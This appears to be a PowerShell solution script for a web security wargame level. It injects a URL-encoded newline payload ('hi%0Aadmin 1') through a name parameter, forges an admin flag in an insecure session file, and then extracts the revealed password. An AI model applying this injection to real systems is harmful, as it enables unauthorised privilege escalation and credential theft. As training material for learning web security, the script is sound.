param (
    [Parameter(Mandatory=$true)]
    [string]$server,
    [Parameter(Mandatory=$true)]
    [string]$username,
    [Parameter(Mandatory=$true)]
    [string]$password,
    [Parameter(Mandatory=$true)]
    [string]$name
)
$url = $server

#solution is like this: "hi%0Aadmin 1"
#"hi"->puts something in name. "%0A"->is a newline character "admin 1"-> after the newline character, abuse the poor encoding

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
}

#establish a session
$commandurl = $url;
$response = iwr -Headers $headers -URI $url -SessionVariable requestSession;

#write into the insecure session file
$commandurl = $url + "?debug&name=$name";
$response = iwr -Headers $headers -URI $commandurl -Method Post -WebSession  $requestSession;

#load page again to be shown the credentials, since the session now has "admin => 1"
$commandurl = $url;
$response = iwr -Headers $headers -URI $commandurl -Method Get -WebSession  $requestSession;

write-host `n$response.Content`n"---------------------------------------------------------"
Write-Host (((($response.Content -replace "<br>", "`n") -split "`n") | Where-Object { $_ -match 'You are an admin' }) -join "`n")
Write-Host (((($response.Content -replace "<br>", "`n") -split "`n") | Where-Object { $_ -match 'Password' }) -join "`n")`n"---------------------------------------------------------"